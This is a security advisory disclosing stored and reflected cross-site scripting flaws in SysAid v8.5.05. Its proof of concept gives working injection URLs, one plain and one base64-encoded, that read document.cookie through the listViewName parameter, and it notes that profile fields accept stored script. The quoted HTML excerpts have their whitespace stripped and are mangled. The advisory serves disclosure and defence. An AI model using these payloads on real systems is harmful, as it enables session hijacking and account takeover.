Abstract:
=========
A Vulnerability Laboratory Researcher discovered multiple persistent and non-persistent Web Vulnerabilities in Ilients SysAid v8.5.05.

Affected Products:
==================
Ilient

Severity:
=========
Medium


Details:
========
Multiple non-persistent and persistent input validation vulnerabilities are detected on Ilient 
SysAid v8.5.05 and below. The bugs allow remote attackers to implement/inject malicious script 
code on the application side (persistent) and temporarily on the user side (non-persistent).
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or 
stable (persistent) context manipulation.

Proof of Concept:
=================
The vulnerabilities can be exploited by remote attacker with required user inter aciton. For demonstration or reproduce ...

1.1 - Persistent
All fields in the user-profile are vulnerable which are displayed somewhere on the frontend, like: Phone, Email or Name
To exploit the issue a user just need to include his own script code on his profile section & start a inter action.

Persistent(Frontpage):
<tablewidth="100%"cellspacing="5"cellpadding="5"border="0"class="Maxed">
<tbody><trvalign="top"><tdwidth="50%"style="padding:10px;"id="Container_1"><tableclass="MaxedContainerContainer_1">
<tbody><tr>
<tdclass="Container_Header">
<table>
<tbody><tr>
<tdclass="Container_Header_First">
<tdclass="Container_Header_Center">
Administratorsonline
</td><tdclass="Container_Header_Last">
</td>

</tr>
</tbody></table></td>
</tr>
<tr>
<tdclass="Container_Body">
<divclass="BorderFix_FFForm_Ctrl_Label">
<br/>
1Users<br/>
JulienAhrens<EXCUTES PERSISTENT SCRIPt CODE HERE!></div></td></tr></tbody></table></td></tr></tbody>
</table></div></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></body></html>



1.2
Non-persistent XSS:
http://localhost:8080/sysaid/CustomizeListView.jsp?listName=Assets&listViewName=<script>alert(document.cookie)</script>

or base64 encoded:
http://localhost:8080/sysaid/CustomizeListView.jsp?listName=Service%20Requests&srType=1&listViewName=@BASE64@PHNjcmlwdD5hb
GVydChlc2NhcGUoZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4=



Non-persistent(listViewName):

<tdcolspan="6"class="Frame_Body_Center">
<tablewidth="100%"border="0"class="Maxed">

<tbody><trvalign="top">
<tdstyle="padding:10px;"id="Conainer_1">
<tablewidth=""cellspacing="0"cellpadding="0"border="0">
<tbody><tr>
<td>
<tablewidth="100%"cellspacing="0"cellpadding="0"border="0"class="MaxedContainerContainer_1">

<tbody><tr>
<tdclass="Container_Header">

<table>
<tbody><tr>
<tdclass="Container_Header_First"/>
<tdclass="Container_Header_Center">

</p></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr>
</tbody></table></td></tr></tbody></table></form></body></html>


Risk:
=====
The security risk of the vulnerabilities are estimated as medium(-).
